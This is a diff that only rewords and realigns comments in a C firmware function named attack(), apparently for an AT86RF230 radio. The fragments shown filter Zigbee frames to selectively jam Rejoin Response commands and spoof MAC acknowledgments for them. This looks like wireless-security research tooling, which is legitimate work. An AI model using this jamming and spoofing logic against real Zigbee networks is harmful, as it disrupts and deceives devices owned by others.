@@ -47,7 +47,7 @@ bool attack(void)
 	/* Check the length of the received packet */
 	phy_len = spi_recv();
 	if ((phy_len < 5) || (phy_len & 0x80)) {
-		/* Ignore packets with invalid PHY Length */
+		/* Ignore packets with invalid length */
 		spi_end();
 		return 1;
 	}
@@ -178,15 +178,15 @@ bool attack(void)
 	nwk_radius = spi_recv();
 
 	/*
-	 * Compute the payload length of the NWK command
+	 * Compute the payload length of the NWK command.
 	 * The constant 38 was derived by summing the following:
-	 * 17: Processed bytes
-	 *  1: NWK Sequence Number
-	 * 14: NWK Auxiliary Header
-	 *  1: NWK Command Identifier
-	 *  4: NWK Message Integrity Code
-	 *  2: MAC Frame Check Sequence
-	 * -1: PHY Length
+	 *   17: Processed bytes
+	 *    1: NWK Sequence Number
+	 *   14: NWK Auxiliary Header
+	 *    1: NWK Command Identifier
+	 *    4: NWK Message Integrity Code
+	 *    2: MAC Frame Check Sequence
+	 *   -1: PHY Length
 	 */
 	nwk_cmd_len = phy_len - (expected_bytes + 38);
 
@@ -194,8 +194,8 @@ bool attack(void)
 	if ((nwk_cmd_len != 12) && (nwk_cmd_len != 3 || nwk_radius != 1
 	    || nwk_src_1 != mac_src_1 || nwk_src_0 != mac_src_0)) {
 		/*
-		 * The packet is not a Network Update
-		 * or a Rejoin Response command
+		 * The packet is not a Network Update command
+		 * or a Rejoin Response
 		 */
 		spi_end();
 		return 1;
@@ -227,10 +227,7 @@ bool attack(void)
 	/* Transition into the BUSY_TX state */
 	slp_tr();
 
-	/*
-	 * Spoof a MAC Acknowledgment packet
-	 * for each jammed Rejoin Response command
-	 */
+	/* Spoof a MAC acknowledgment for each jammed Rejoin Response */
 	if (nwk_cmd_len == 3 && nwk_radius == 1
 	    && nwk_src_1 == mac_src_1 && nwk_src_0 == mac_src_0) {
 		/* Wait for the transmission of the spoofed packet */
@@ -240,7 +237,7 @@ bool attack(void)
 		}
 		_delay_us(400);
 
-		/* Spoof a MAC Acknowledgment packet */
+		/* Spoof a MAC acknowledgment */
 		spi_begin();
 		spi_send(AT86RF230_BUF_WRITE);
 		spi_send(5);
